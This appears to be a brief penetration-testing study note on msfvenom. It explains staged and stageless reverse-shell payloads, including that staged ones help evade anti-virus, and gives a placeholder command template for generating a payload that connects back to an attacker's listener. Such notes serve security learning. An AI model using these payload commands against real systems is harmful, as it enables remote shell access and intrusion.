# MSFVENOM
#### Staged Payloads
These are sent in two parts with the first part being the stager which is executed on the target machine which connects back to the attacking machines listener. The second part which is the payload containing the code for the reverse shell. Used to get around anti-virus. 
#### Stageless Payloads
This is self-contained code which sends a shell immediately back to the listener but is easily identifiable by anti-virus. 
Syntax for a typical msfvenom payload:
```text
msfvenom -p [operating_system]/[architecture]/[payload] -f [format] -o [filename] LHOST=[listening_ip_address] LPORT=[listening_port_number]
```
- specify the format (-f), e.g .exe, .py, .aspx
- specify the output and filename (-o), e.g shell.exe
- LHOST is the attacking machine listening ip address
- LPORT is the attacking machines listening port
  
To check available formats (-f):
```text
msfvenom --list formats
```
